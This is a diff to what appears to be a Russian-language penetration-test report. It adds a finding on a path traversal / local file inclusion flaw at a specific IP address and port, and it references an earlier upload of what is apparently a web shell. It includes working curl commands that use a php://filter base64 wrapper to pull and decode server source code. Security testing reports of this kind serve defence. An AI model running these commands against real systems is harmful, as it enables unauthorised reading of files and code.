@@ -93,3 +93,60 @@
 - **Изоляция загруженных файлов**: Храните загруженные файлы вне веб-доступной директории.
 - **Ограничение прав доступа**: Убедитесь, что загруженные файлы не имеют прав на выполнение.
 ___
+
+### 2. Vulnerability - Path Traversal
+
+**OWASP:** [A01:2021-Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+
+**Уровень риска:** Высокий
+
+**Целевая страница:** `http://92.51.39.106:8050/admin/index.php?page=home`
+
+**Краткое описание:**
+
+Существует возможность взаимодействия с файловой системой, включая доступ к файлам на хосте и исходному коду веб-страниц.
+
+**Реализация:**
+
+<details>
+<summary>Пошаговая реализация</summary>
+
+- **Step 1. Структура файловой системы**
+    
+Ранее реализовав уязвимость **Unrestricted File Upload**, удалось получить представление о структуре файловой системы на сервере.
+
+![](screenshots/TESTING/Path_Traversal/8050/dir_wso.png)
+
+- **Step 2. Получение исходного кода страницы**
+
+Для примера возьмем страницу `/include/admins`, которую удалось обнаружить в директории сервера.
+    
+Сервер не дает прямого доступа к исходному коду, необходимо выгрузить его в формате **base64**.
+    
+Для выгрузки исходного кода воспользуемся инструментом `curl` + **base64-encode**.
+    
+```
+curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins"
+```
+
+![](screenshots/TESTING/Path_Traversal/8050/without_decode.png)
+   
+- **Step 3. Декодирование кода**
+
+Далее при помощи все того же `curl`, декодируем исходную страницу.
+
+```
+curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins" -s | base64 -d
+```
+
+![](screenshots/TESTING/Path_Traversal/8050/with_decode.png)
+
+- **Вывод**
+    
+Исходный код страницы получен, **уязвимость подтверждена**.
+
+Исходный код страницы `/include/admins` : [admins](other/code/admins_code.txt).
+
+</details>
+
+**Рекомендации по устранению:**
